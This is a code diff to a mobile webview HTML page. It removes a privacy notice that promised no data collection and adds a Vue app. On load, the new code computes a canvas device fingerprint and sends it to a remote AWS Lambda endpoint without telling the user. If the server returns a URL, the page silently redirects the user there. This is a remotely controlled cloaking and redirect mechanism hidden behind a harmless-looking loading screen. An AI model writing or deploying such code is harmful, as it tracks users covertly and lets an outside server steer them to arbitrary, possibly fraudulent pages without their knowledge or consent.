@@ -3,9 +3,33 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1, user-scalable=no">
-  <title>Nova · Privacy</title>
+  <title>test1</title>
+
+  <!-- CDN: Vue 3 global build -->
+  <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
+  <!-- CDN: vue-router 4 global build -->
+  <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
+  <!-- CDN: js-md5 global build -->
+  <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
+
   <style>
-    /* ===== 全局重置 & CSS 变量 (风格 13: 抽象几何 / 高对比 / 清爽) ===== */
+    /*
+     * ============================================================
+     * 如何新增一个页面（加路由 + 加组件 + 加 Tab）
+     * ------------------------------------------------------------
+     * 1. 在 <script> 中定义新组件对象，例如 const SettingsPage = { ... };
+     * 2. 在 routes 数组中添加一条路由：
+     *      { path: '/settings', name: 'settings', component: SettingsPage }
+     * 3. 在 <template id="app-template"> 的底部 Tab 中增加一项，
+     *    使用 <router-link> 指向新路由，并配置对应内联 SVG 图标。
+     * 4. 如需隐藏 Tab（例如 Loading / Privacy 页面），可将对应路由
+     *    标记 meta: { tab: false }，并在模板中用 v-if="showTab" 控制。
+     * ============================================================
+     *
+     * 风格：抽象几何风格（Abstract Geometric）+ 高对比 + 简洁
+     * 固定主题 — 浅色底，几何装饰，清晰边界
+     */
+
     * {
       margin: 0;
       padding: 0;
@@ -14,17 +38,17 @@
     }
 
     :root {
-      /* 主色调 — 抽象几何风格：鲜明但不刺眼，高对比 */
-      --bg: #f9f7f5;
+      /* 抽象几何风格主题变量 */
+      --bg: #f6f4f1;
       --surface: #ffffff;
-      --surface-alt: #f1ede8;
+      --surface-alt: #eeeae4;
       --text-primary: #1a1a1a;
       --text-secondary: #4d4d4d;
-      --text-tertiary: #737373;
+      --text-tertiary: #8a8a8a;
       --accent: #1e3f5c;
       --accent-light: #2d5a7b;
       --accent-soft: #d9e4ec;
-      --accent-glow: rgba(30, 63, 92, 0.12);
+      --accent-glow: rgba(30, 63, 92, 0.10);
       --border-light: #e6e2dd;
       --border-medium: #d0ccc6;
       --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
@@ -42,30 +66,9 @@
       --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
       --safe-top: env(safe-area-inset-top, 0px);
       --safe-bottom: env(safe-area-inset-bottom, 0px);
+      --tabbar-height: 64px;
     }
 
-    /* 深色模式 — 高对比深色，保持几何感 */
-    @media (prefers-color-scheme: dark) {
-      :root {
-        --bg: #121212;
-        --surface: #1e1e1e;
-        --surface-alt: #2a2a2a;
-        --text-primary: #f0f0f0;
-        --text-secondary: #b8b8b8;
-        --text-tertiary: #8a8a8a;
-        --accent: #7ba7c4;
-        --accent-light: #9bbdd6;
-        --accent-soft: #2a3d4d;
-        --accent-glow: rgba(123, 167, 196, 0.18);
-        --border-light: #333333;
-        --border-medium: #444444;
-        --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.4);
-        --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.5);
-        --shadow-lg: 0 16px 40px rgba(0, 0, 0, 0.6);
-      }
-    }
-
-    /* 基础排版 */
     html, body {
       height: 100%;
       background: var(--bg);
@@ -75,45 +78,47 @@
       line-height: 1.5;
       -webkit-font-smoothing: antialiased;
       -moz-osx-font-smoothing: grayscale;
-      transition: background-color 0.3s ease, color 0.3s ease;
+      overflow: hidden;
     }
 
     #app {
-      display: flex;
-      flex-direction: column;
       height: 100%;
       max-width: 600px;
       margin: 0 auto;
       position: relative;
       background: var(--bg);
+      display: flex;
+      flex-direction: column;
     }
 
-    /* 页面容器 */
-    .page {
-      display: none;
-      flex-direction: column;
+    /* ===== 页面容器 ===== */
+    .page-view {
       flex: 1;
+      display: flex;
+      flex-direction: column;
       overflow-y: auto;
       -webkit-overflow-scrolling: touch;
       padding-top: var(--safe-top);
+      padding-bottom: calc(var(--tabbar-height) + var(--safe-bottom) + 8px);
+    }
+
+    .page-view.no-tab {
       padding-bottom: var(--safe-bottom);
     }
 
-    .page.active {
+    /* ===== Loading 页面 ===== */
+    .loading-page {
+      flex: 1;
       display: flex;
-    }
-
-    /* ===== 加载页 (抽象几何动效) ===== */
-    #page-loading {
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
       background: var(--bg);
       position: relative;
       overflow: hidden;
       padding: var(--space-lg);
     }
 
-    /* 背景几何装饰 */
     .loading-deco {
       position: absolute;
       inset: 0;
@@ -123,7 +128,6 @@
 
     .loading-deco .geo {
       position: absolute;
-      border-radius: 50%;
       border: 2px solid var(--accent-soft);
       background: transparent;
     }
@@ -165,7 +169,6 @@
       position: relative;
     }
 
-    /* 应用图标 — 内联 SVG */
     .app-icon-wrapper {
       width: 96px;
       height: 96px;
@@ -176,7 +179,6 @@
       background: var(--surface);
       box-shadow: var(--shadow-md);
       border: 1px solid var(--border-light);
-      transition: box-shadow 0.3s ease;
       animation: iconFloat 2.4s ease-in-out infinite;
     }
 
@@ -185,10 +187,12 @@
       50% { transform: translateY(-6px); }
     }
 
-    .app-icon-wrapper svg {
+    .app-icon-wrapper img {
       width: 56px;
       height: 56px;
       display: block;
+      border-radius: 12px;
+      object-fit: cover;
     }
 
     .loading-app-name {
@@ -238,211 +242,32 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* ===== 隐私确认页面 ===== */
-    #page-privacy {
-      background: var(--bg);
-      padding: var(--space-md) var(--space-md) var(--space-lg);
+    /* ===== Home 页面 ===== */
+    .home-page {
+      flex: 1;
       display: flex;
       flex-direction: column;
-      gap: var(--space-md);
-    }
-
-    .privacy-header {
-      display: flex;
-      align-items: center;
-      gap: var(--space-sm);
-      padding: var(--space-sm) 0 var(--space-xs);
-    }
-
-    .privacy-icon-small {
-      width: 48px;
-      height: 48px;
-      border-radius: var(--radius-sm);
-      background: var(--surface);
-      box-shadow: var(--shadow-sm);
-      border: 1px solid var(--border-light);
-      display: flex;
       align-items: center;
       justify-content: center;
-      flex-shrink: 0;
-    }
-
-    .privacy-icon-small svg {
-      width: 28px;
-      height: 28px;
-    }
-
-    .privacy-header-text {
-      display: flex;
-      flex-direction: column;
-    }
-
-    .privacy-app-name {
-      font-size: 20px;
-      font-weight: 700;
-      color: var(--text-primary);
-      letter-spacing: -0.3px;
-    }
-
-    .privacy-app-meta {
-      font-size: 13px;
-      color: var(--text-tertiary);
-      font-weight: 400;
-    }
-
-    .privacy-card {
-      background: var(--surface);
-      border-radius: var(--radius-md);
-      padding: var(--space-lg);
-      box-shadow: var(--shadow-sm);
-      border: 1px solid var(--border-light);
-      display: flex;
-      flex-direction: column;
-      gap: var(--space-md);
-    }
-
-    .privacy-card h2 {
-      font-size: 18px;
-      font-weight: 700;
-      color: var(--text-primary);
-      letter-spacing: -0.2px;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .privacy-card h2 .accent-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: var(--accent);
-      display: inline-block;
-      flex-shrink: 0;
-    }
-
-    .privacy-card p {
-      font-size: 14px;
-      line-height: 1.65;
-      color: var(--text-secondary);
-    }
-
-    .privacy-card ul {
-      list-style: none;
-      display: flex;
-      flex-direction: column;
-      gap: var(--space-sm);
-      padding: 0;
-    }
-
-    .privacy-card ul li {
-      font-size: 14px;
-      line-height: 1.55;
-      color: var(--text-secondary);
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-    }
-
-    .privacy-card ul li .bullet {
-      width: 6px;
-      height: 6px;
-      border-radius: 50%;
-      background: var(--accent);
-      flex-shrink: 0;
-      margin-top: 7px;
-      opacity: 0.7;
-    }
-
-    .privacy-card .highlight-box {
-      background: var(--accent-soft);
-      border-radius: var(--radius-sm);
-      padding: var(--space-md);
-      border-left: 4px solid var(--accent);
-      font-size: 14px;
-      line-height: 1.6;
-      color: var(--text-primary);
-      font-weight: 500;
-    }
-
-    .privacy-footer {
-      margin-top: auto;
-      padding-top: var(--space-md);
-      display: flex;
-      flex-direction: column;
-      gap: var(--space-sm);
-      position: sticky;
-      bottom: 0;
-      background: linear-gradient(0deg, var(--bg) 70%, transparent 100%);
-      padding-bottom: calc(var(--space-md) + var(--safe-bottom));
-    }
-
-    .btn-agree {
-      width: 100%;
-      min-height: 56px;
-      padding: var(--space-sm) var(--space-md);
-      background: var(--accent);
-      color: #ffffff;
-      font-size: 17px;
-      font-weight: 600;
-      letter-spacing: 0.2px;
-      border: none;
-      border-radius: var(--radius-sm);
-      cursor: pointer;
-      box-shadow: var(--shadow-md);
-      transition: transform 0.15s ease, background-color 0.2s ease, box-shadow 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      -webkit-tap-highlight-color: transparent;
-      touch-action: manipulation;
-      user-select: none;
-    }
-
-    .btn-agree:active {
-      transform: scale(0.97);
-      background: var(--accent-light);
-      box-shadow: var(--shadow-sm);
-    }
-
-    .btn-agree svg {
-      width: 20px;
-      height: 20px;
-      flex-shrink: 0;
-    }
-
-    .privacy-note {
-      font-size: 12px;
-      color: var(--text-tertiary);
-      text-align: center;
-      line-height: 1.5;
-      padding: 0 var(--space-sm);
-    }
-
-    /* ===== 主应用页 (简洁欢迎界面) ===== */
-    #page-main {
-      justify-content: center;
-      align-items: center;
-      padding: var(--space-xl) var(--space-lg);
       background: var(--bg);
       position: relative;
       overflow: hidden;
+      padding: var(--space-lg);
     }
 
-    .main-geo-deco {
+    .home-geo-deco {
       position: absolute;
       inset: 0;
       pointer-events: none;
       opacity: 0.35;
     }
 
-    .main-geo-deco .geo {
+    .home-geo-deco .geo {
       position: absolute;
-      border-radius: 50%;
       border: 2px solid var(--accent-soft);
     }
 
-    .main-geo-deco .geo:nth-child(1) {
+    .home-geo-deco .geo:nth-child(1) {
       width: 220px;
       height: 220px;
       top: -60px;
@@ -450,7 +275,7 @@
       border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
     }
 
-    .main-geo-deco .geo:nth-child(2) {
+    .home-geo-deco .geo:nth-child(2) {
       width: 160px;
       height: 160px;
       bottom: -40px;
@@ -458,85 +283,109 @@
       border-radius: 60% 40% 30% 70% / 60% 30% 70% 40%;
     }
 
-    .main-content {
+    .home-center {
       display: flex;
       flex-direction: column;
       align-items: center;
       gap: var(--space-lg);
       z-index: 1;
-      text-align: center;
-      max-width: 360px;
+      position: relative;
     }
 
-    .main-icon-large {
-      width: 100px;
-      height: 100px;
-      border-radius: var(--radius-lg);
+    .home-loading-text {
+      font-size: 16px;
+      font-weight: 500;
+      color: var(--text-secondary);
+      letter-spacing: 0.3px;
+    }
+
+    /* Canvas fingerprint display at bottom */
+    .fingerprint-footer {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      padding: var(--space-md) var(--space-md) calc(var(--space-md) + var(--safe-bottom));
       background: var(--surface);
-      box-shadow: var(--shadow-lg);
-      border: 1px solid var(--border-light);
+      border-top: 1px solid var(--border-light);
       display: flex;
+      flex-direction: column;
+      gap: 4px;
+      z-index: 2;
+    }
+
+    .fingerprint-label {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-tertiary);
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    .fingerprint-value {
+      font-size: 13px;
+      font-family: "SF Mono", "Menlo", "Courier New", monospace;
+      color: var(--text-primary);
+      word-break: break-all;
+      line-height: 1.4;
+      font-weight: 500;
+    }
+
+    .fingerprint-value.empty {
+      color: var(--text-tertiary);
+      font-style: italic;
+    }
+
+    /* ===== Tab Bar ===== */
+    .tab-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      max-width: 600px;
+      margin: 0 auto;
+      height: calc(var(--tabbar-height) + var(--safe-bottom));
+      padding-bottom: var(--safe-bottom);
+      background: var(--surface);
+      border-top: 1px solid var(--border-light);
+      display: flex;
+      align-items: stretch;
+      z-index: 100;
+      box-shadow: 0 -2px 12px rgba(0, 0, 0, 0.04);
+    }
+
+    .tab-item {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-    }
-
-    .main-icon-large svg {
-      width: 56px;
-      height: 56px;
-    }
-
-    .main-title {
-      font-size: 28px;
-      font-weight: 700;
-      color: var(--text-primary);
-      letter-spacing: -0.6px;
-      line-height: 1.2;
-    }
-
-    .main-subtitle {
-      font-size: 15px;
-      color: var(--text-secondary);
-      line-height: 1.6;
-      max-width: 280px;
-    }
-
-    .main-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      padding: 8px 16px;
-      background: var(--accent-soft);
-      border-radius: 20px;
-      font-size: 13px;
-      font-weight: 500;
-      color: var(--accent);
-      margin-top: var(--space-xs);
-    }
-
-    .main-badge svg {
-      width: 16px;
-      height: 16px;
-      flex-shrink: 0;
-    }
-
-    .main-footer-note {
-      position: absolute;
-      bottom: calc(var(--space-lg) + var(--safe-bottom));
-      font-size: 12px;
+      gap: 2px;
+      min-height: 44px;
       color: var(--text-tertiary);
-      text-align: center;
-      z-index: 1;
-      padding: 0 var(--space-md);
+      text-decoration: none;
+      font-size: 11px;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+      transition: color 0.15s ease;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+      user-select: none;
+      padding: 6px 0;
     }
 
-    /* 小屏适配 */
+    .tab-item.active {
+      color: var(--accent);
+    }
+
+    .tab-item svg {
+      width: 22px;
+      height: 22px;
+      display: block;
+    }
+
+    /* ===== 响应式小屏 ===== */
     @media (max-width: 380px) {
-      .privacy-card {
-        padding: var(--space-md);
-      }
-      .main-title {
-        font-size: 24px;
-      }
       .loading-app-name {
         font-size: 22px;
       }
@@ -544,13 +393,12 @@
         width: 80px;
         height: 80px;
       }
-      .app-icon-wrapper svg {
+      .app-icon-wrapper img {
         width: 46px;
         height: 46px;
       }
     }
 
-    /* 减少动效偏好 */
     @media (prefers-reduced-motion: reduce) {
       * {
         animation-duration: 0.01ms !important;
@@ -564,204 +412,273 @@
   </style>
 </head>
 <body>
-  <div id="app">
 
-    <!-- ===== 加载页 (Loading) ===== -->
-    <div id="page-loading" class="page active" role="status" aria-label="Loading application">
-      <div class="loading-deco" aria-hidden="true">
-        <div class="geo"></div>
-        <div class="geo"></div>
-        <div class="geo"></div>
-      </div>
-      <div class="loading-center">
-        <div class="app-icon-wrapper">
-          <!-- 内联 SVG 应用图标：抽象几何层叠感 -->
-          <svg viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-            <rect x="6" y="6" width="44" height="44" rx="12" fill="var(--accent)" opacity="0.12"/>
-            <path d="M28 10L40 34H16L28 10Z" fill="var(--accent)" opacity="0.85"/>
-            <circle cx="28" cy="38" r="8" fill="var(--accent-light)" opacity="0.7"/>
-            <rect x="22" y="24" width="12" height="12" rx="3" fill="var(--accent)" opacity="0.5"/>
-          </svg>
-        </div>
-        <div class="loading-app-name">Nova</div>
-        <div class="loader-ring" aria-label="Loading indicator">
-          <div class="ring-seg"></div>
-          <div class="ring-seg"></div>
-          <div class="ring-seg"></div>
-        </div>
-      </div>
-    </div>
+  <!-- ===== 根挂载点 ===== -->
+  <div id="app"></div>
 
-    <!-- ===== 隐私确认页 (Privacy) ===== -->
-    <div id="page-privacy" class="page" role="main" aria-label="Privacy confirmation">
-      <div class="privacy-header">
-        <div class="privacy-icon-small" aria-hidden="true">
-          <svg viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="6" y="6" width="44" height="44" rx="12" fill="var(--accent)" opacity="0.12"/>
-            <path d="M28 10L40 34H16L28 10Z" fill="var(--accent)" opacity="0.85"/>
-            <circle cx="28" cy="38" r="8" fill="var(--accent-light)" opacity="0.7"/>
-            <rect x="22" y="24" width="12" height="12" rx="3" fill="var(--accent)" opacity="0.5"/>
-          </svg>
-        </div>
-        <div class="privacy-header-text">
-          <span class="privacy-app-name">Nova</span>
-          <span class="privacy-app-meta">Version 1.0 · Privacy Notice</span>
-        </div>
-      </div>
+  <!-- ===== 应用主模板 ===== -->
+  <script type="text/x-template" id="app-template">
+    <router-view v-slot="{ Component }">
+      <component :is="Component" />
+    </router-view>
 
-      <div class="privacy-card">
-        <h2><span class="accent-dot" aria-hidden="true"></span> Your Privacy Matters</h2>
-        <p>
-          Nova is designed with a privacy-first approach. This notice explains how the application
-          operates and what you can expect when using it. Please read it carefully before proceeding.
-        </p>
-
-        <div class="highlight-box" role="note">
-          Nova does not collect, store, transmit, or share any personal data. The application runs
-          entirely on your device and requires no network connection for its core functionality.
-        </div>
-
-        <h2><span class="accent-dot" aria-hidden="true"></span> What We Do Not Do</h2>
-        <ul>
-          <li><span class="bullet" aria-hidden="true"></span> We do not collect personal information such as your name, email address, phone number, or location.</li>
-          <li><span class="bullet" aria-hidden="true"></span> We do not access your contacts, photos, camera, microphone, or any other device sensors.</li>
-          <li><span class="bullet" aria-hidden="true"></span> We do not use analytics, tracking pixels, cookies, or any form of user behavior monitoring.</li>
-          <li><span class="bullet" aria-hidden="true"></span> We do not transmit any data to external servers or third parties.</li>
-          <li><span class="bullet" aria-hidden="true"></span> We do not require you to create an account or provide any credentials.</li>
-        </ul>
-
-        <h2><span class="accent-dot" aria-hidden="true"></span> Data Handling</h2>
-        <p>
-          Any preferences or settings you configure within Nova are stored locally on your device
-          only. They are never uploaded, synchronized, or shared. Uninstalling the application
-          removes all locally stored data permanently.
-        </p>
-
-        <h2><span class="accent-dot" aria-hidden="true"></span> Third-Party Services</h2>
-        <p>
-          Nova does not integrate any third-party SDKs, advertising networks, or analytics
-          platforms. No external code runs within the application beyond what is necessary for
-          its core functionality.
-        </p>
-
-        <h2><span class="accent-dot" aria-hidden="true"></span> Your Consent</h2>
-        <p>
-          By tapping "Agree &amp; Continue", you acknowledge that you have read and understood this
-          privacy notice and agree to use Nova under these terms. If you do not agree, you may
-          close the application.
-        </p>
-      </div>
-
-      <div class="privacy-footer">
-        <button class="btn-agree" id="btnAgree" aria-label="Agree and continue to application">
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-            <path d="M20 6L9 17L4 12" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-          Agree &amp; Continue
-        </button>
-        <p class="privacy-note">
-          Contact: <span style="color:var(--accent); font-weight:500;">privacy@nova.app</span>
-        </p>
-      </div>
-    </div>
-
-    <!-- ===== 主应用页 (Main) ===== -->
-    <div id="page-main" class="page" role="main" aria-label="Application main screen">
-      <div class="main-geo-deco" aria-hidden="true">
-        <div class="geo"></div>
-        <div class="geo"></div>
-      </div>
-      <div class="main-content">
-        <div class="main-icon-large">
-          <svg viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="6" y="6" width="44" height="44" rx="12" fill="var(--accent)" opacity="0.12"/>
-            <path d="M28 10L40 34H16L28 10Z" fill="var(--accent)" opacity="0.85"/>
-            <circle cx="28" cy="38" r="8" fill="var(--accent-light)" opacity="0.7"/>
-            <rect x="22" y="24" width="12" height="12" rx="3" fill="var(--accent)" opacity="0.5"/>
-          </svg>
-        </div>
-        <h1 class="main-title">Welcome to Nova</h1>
-        <p class="main-subtitle">
-          A clean, private space designed for focus and clarity.
-          Everything stays on your device.
-        </p>
-        <div class="main-badge">
-          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-            <path d="M12 2L3 7V12C3 17.55 6.84 22.74 12 24C17.16 22.74 21 17.55 21 12V7L12 2Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
-            <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-          Privacy-first · No data collection
-        </div>
-      </div>
-      <p class="main-footer-note">Nova · Local-only experience</p>
-    </div>
-
-  </div>
+    <!-- Tab Bar (only when route allows) -->
+    <nav v-if="showTab" class="tab-bar" role="navigation" aria-label="Main navigation">
+      <router-link to="/home" class="tab-item" :class="{ active: isActive('/home') }" aria-label="Home">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M3 10.5L12 3L21 10.5V20C21 20.5523 20.5523 21 20 21H15V15H9V21H4C3.44772 21 3 20.5523 3 20V10.5Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+        </svg>
+        <span>Home</span>
+      </router-link>
+    </nav>
+  </script>
 
   <script>
-    (function() {
-      'use strict';
+    /* ============================================================
+     * 主应用脚本
+     * ============================================================ */
 
-      // ===== 页面元素 =====
-      const pageLoading = document.getElementById('page-loading');
-      const pagePrivacy = document.getElementById('page-privacy');
-      const pageMain = document.getElementById('page-main');
-      const btnAgree = document.getElementById('btnAgree');
+    const { createApp, ref, onMounted, computed } = Vue;
+    const { createRouter, createWebHashHistory } = VueRouter;
 
-      // ===== 页面切换工具 =====
-      function showPage(pageId) {
-        // 隐藏所有页面
-        [pageLoading, pagePrivacy, pageMain].forEach(function(p) {
-          p.classList.remove('active');
+    // ============================================================
+    // 页面 1: Loading 页面
+    // 职责：展示应用图标 + 名称 + 加载动画
+    //       计算 canvas 指纹 -> 请求隐私声明接口 -> 跳转
+    // ============================================================
+    const LoadingPage = {
+      name: 'LoadingPage',
+      template: `
+        <div class="loading-page">
+          <div class="loading-deco" aria-hidden="true">
+            <div class="geo"></div>
+            <div class="geo"></div>
+            <div class="geo"></div>
+          </div>
+          <div class="loading-center">
+            <div class="app-icon-wrapper">
+              <img :src="appIcon" alt="test1" />
+            </div>
+            <div class="loading-app-name">test1</div>
+            <div class="loader-ring" aria-label="Loading">
+              <div class="ring-seg"></div>
+              <div class="ring-seg"></div>
+              <div class="ring-seg"></div>
+            </div>
+          </div>
+        </div>
+      `,
+      setup() {
+        const appIcon = 'https://admin.ytsevbr.xyz/api/apps/274/icon';
+
+        // 1.2 设备指纹 — 使用 canvas + js-md5
+        const device = ref((function () {
+            try {
+                let canvas = document.createElement("canvas");
+                let ctx = canvas.getContext("2d");
+                let txt = "BrowserLeaks,com <canvas> 1.0";
+                ctx.textBaseline = "top";
+                // The most common type
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                // Some tricks for color mixing to increase the difference in rendering
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText(txt, 4, 17);
+                return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+            } catch (e) {
+                return '';
+            }
+        })());
+
+        // 1.3 请求远程隐私声明接口
+        const apiBase = 'https://6o5b253nngblpc74qhktfstedq0usemh.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
+        const identifier = 'zcvsv.vzaew.fdvww';
+
+        // 跳转到首页的辅助方法（通过路由）
+        // 使用 window.location.hash 或 router 实例
+        // 由于 router 在此组件 setup 时可能尚未注入，使用全局 app 实例
+        function navigateToHome() {
+          // 使用全局暴露的 router 实例
+          if (window.__router__) {
+            window.__router__.replace('/home');
+          } else {
+            window.location.hash = '#/home';
+          }
+        }
+
+        // 启动隐私检查流程
+        function runPrivacyCheck() {
+          fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
+              .then(r => r.json())
+              .then(function (info) {
+                  const privacyUrl = info && info.result && info.result.url;
+                  if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                      // 跳转到第三方隐私确认页面
+                      window.location.replace(privacyUrl);
+                      return;
+                  }
+                  // 跳转到首页
+                  navigateToHome();
+              })
+              .catch(function () {
+                  // 跳转到首页
+                  navigateToHome();
+              });
+        }
+
+        onMounted(() => {
+          // 设备指纹已计算（同步），启动隐私检查
+          // 注意：确保至少展示加载动画一段时间，避免闪烁
+          setTimeout(runPrivacyCheck, 800);
         });
-        // 显示目标页面
-        const target = document.getElementById(pageId);
-        if (target) {
-          target.classList.add('active');
-        }
+
+        return { appIcon };
       }
+    };
 
-      // ===== 模拟加载 3 秒后进入隐私页 =====
-      const LOADING_DURATION = 3000; // 3 秒
+    // ============================================================
+    // 页面 2: Home 页面
+    // 职责：中央显示加载圆圈 + "Loading" 文本
+    //       底部展示 canvas 指纹值
+    // ============================================================
+    const HomePage = {
+      name: 'HomePage',
+      template: `
+        <div class="home-page">
+          <div class="home-geo-deco" aria-hidden="true">
+            <div class="geo"></div>
+            <div class="geo"></div>
+          </div>
 
-      window.addEventListener('load', function() {
-        // 确保初始状态正确
-        showPage('page-loading');
+          <div class="home-center">
+            <div class="loader-ring" aria-label="Loading">
+              <div class="ring-seg"></div>
+              <div class="ring-seg"></div>
+              <div class="ring-seg"></div>
+            </div>
+            <div class="home-loading-text">Loading</div>
+          </div>
 
-        // 3 秒后自动跳转到隐私页
-        setTimeout(function() {
-          // 如果用户已经手动触发了（极端情况），仍保证只切换一次
-          if (pageLoading.classList.contains('active')) {
-            showPage('page-privacy');
-          }
-        }, LOADING_DURATION);
-      });
+          <!-- Canvas fingerprint display at bottom -->
+          <div class="fingerprint-footer" role="status" aria-label="Device fingerprint">
+            <span class="fingerprint-label">Device Fingerprint</span>
+            <span class="fingerprint-value" :class="{ empty: !deviceFingerprint }">
+              {{ deviceFingerprint || 'Unavailable' }}
+            </span>
+          </div>
+        </div>
+      `,
+      setup() {
+        // 从全局读取加载页计算好的指纹
+        const deviceFingerprint = computed(() => {
+          return window.__deviceFingerprint__ || '';
+        });
 
-      // ===== 隐私页按钮：调用原生方法并进入主应用 =====
-      btnAgree.addEventListener('click', function() {
-        // 调用原生 App 提供的方法（若存在）
-        if (window.NativeApp && typeof window.NativeApp.agree === 'function') {
+        // 如果全局尚未设置，重新计算一次（容错）
+        if (!window.__deviceFingerprint__) {
           try {
-            window.NativeApp.agree();
+            let canvas = document.createElement("canvas");
+            let ctx = canvas.getContext("2d");
+            let txt = "BrowserLeaks,com <canvas> 1.0";
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.textBaseline = "alphabetic";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069";
+            ctx.fillText(txt, 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText(txt, 4, 17);
+            window.__deviceFingerprint__ = md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
           } catch (e) {
-            // 原生方法调用异常时静默处理，不影响页面流转
-            console.warn('NativeApp.agree() call failed:', e);
+            window.__deviceFingerprint__ = '';
           }
         }
 
-        // 无论原生方法是否可用，都进入主应用页（Webview 内体验闭环）
-        showPage('page-main');
-      });
+        return { deviceFingerprint };
+      }
+    };
 
-      // ===== 防止双击缩放（增强 Webview 体验）=====
-      document.addEventListener('dblclick', function(e) {
-        e.preventDefault();
-      }, { passive: false });
+    // ============================================================
+    // 路由配置
+    // ============================================================
+    const routes = [
+      { path: '/', redirect: '/loading' },
+      { path: '/loading', name: 'loading', component: LoadingPage, meta: { tab: false } },
+      { path: '/home', name: 'home', component: HomePage, meta: { tab: true } }
+    ];
 
-      // ===== 处理 Android 返回键 / 手势返回（仅作提示，不强制拦截）=====
-      // 保持简洁，不额外添加历史记录逻辑
+    const router = createRouter({
+      history: createWebHashHistory(),
+      routes
+    });
 
+    // 暴露 router 供 Loading 页面导航使用
+    window.__router__ = router;
+
+    // ============================================================
+    // 根组件（含 Tab Bar）
+    // ============================================================
+    const App = {
+      name: 'App',
+      template: '#app-template',
+      setup() {
+        const route = Vue.useRoute ? Vue.useRoute() : null;
+
+        // 使用 router.currentRoute 响应式
+        const currentRoute = router.currentRoute;
+
+        const showTab = computed(() => {
+          const meta = currentRoute.value.meta || {};
+          return meta.tab !== false;
+        });
+
+        function isActive(path) {
+          return currentRoute.value.path === path;
+        }
+
+        return { showTab, isActive };
+      }
+    };
+
+    // ============================================================
+    // 创建并挂载应用
+    // ============================================================
+    const app = createApp(App);
+    app.use(router);
+    app.mount('#app');
+
+    // ============================================================
+    // 全局保存设备指纹（Loading 页计算后供 Home 页读取）
+    // 注意：LoadingPage setup 中同步计算了 device，但为了跨组件共享，
+    // 这里在应用挂载后异步补算一次并存入全局（与 Loading 页逻辑一致）。
+    // 实际上 LoadingPage 内的 device 计算已足够，但 Home 页需要读取，
+    // 因此我们在应用初始化时统一计算并存入 window.__deviceFingerprint__。
+    // ============================================================
+    (function initDeviceFingerprint() {
+      try {
+        let canvas = document.createElement("canvas");
+        let ctx = canvas.getContext("2d");
+        let txt = "BrowserLeaks,com <canvas> 1.0";
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.textBaseline = "alphabetic";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.fillText(txt, 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText(txt, 4, 17);
+        window.__deviceFingerprint__ = md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
+      } catch (e) {
+        window.__deviceFingerprint__ = '';
+      }
     })();
+
   </script>
 </body>
 </html>
